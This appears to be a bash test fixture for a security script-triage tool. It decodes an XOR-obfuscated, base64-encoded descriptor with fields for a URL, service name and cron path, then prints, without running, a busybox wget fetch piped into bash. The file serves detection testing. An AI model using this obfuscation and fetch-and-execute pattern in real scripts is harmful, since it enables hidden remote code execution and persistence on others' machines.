#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_b0d17f2a='IB0sUCNXMkIxDG0OfwpjEXQrWTxRPkovA2cOfQ1sGHsTTDxVJUA8XTlYKFw5S3YUYRJrCWYeQTZRNEAfbBh8E2YSbh1pCG8KVTZZLEI2CzpGJUQpWThRNlgHbgo3VDVYKEkgRykEZV1vCj8KbltsWydSIExxGW0ZaRogDyBBeUsuGy5Kf0h/UTRMLUAwXDkXfhBmB2sCZkl9SStJLEgrSWcUfAB1BmMRTi9ILUM3CkI3WS1fOkk6dhd1WjsDMVRhVDAFMgU='
readonly Codec_b0d17f2a='base64_literal|rolling_xor|56'

Load_b0d17f2a() {
  v_a19c=()
  local v_f602
  while read -r v_f602; do [[ -n "$v_f602" ]] && v_a19c+=("$v_f602"); done < <(printf '%s' "${Material_b0d17f2a}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
}

Decode_b0d17f2a() {
  v_b27e=()
  local v_a702=86
  local v_e598
  for ((v_e598=0; v_e598<${#v_a19c[@]}; v_e598++)); do
    v_b27e+=("$((v_a19c[v_e598] ^ v_a702))")
    v_a702=${v_a19c[v_e598]}
  done
}

Recover_b0d17f2a() {
  local -a v_a19c v_b27e
  local v_c304 v_d41a v_b803 v_e598
  v_d41a="${HUNTRESS_FIXTURE_CONTEXT:-host}"
  Load_b0d17f2a
  if ! Decode_b0d17f2a; then return 71; fi
  v_c304=''
  local octal character
  for v_e598 in "${!v_b27e[@]}"; do
    printf -v octal '%03o' "${v_b27e[v_e598]}"
    printf -v character '%b' "\\$octal"
    v_c304+="$character"
  done
  printf '%s\n' "$v_c304"
}

Inspect_b0d17f2a() { local recovered field; local -a fields; recovered="$(Recover_b0d17f2a)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

Plan_b0d17f2a() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_b0d17f2a)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(busybox wget -qO- "$url")
  local -a interpreter=(bash -s)
  declare -p request_command interpreter
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_b0d17f2a; fi
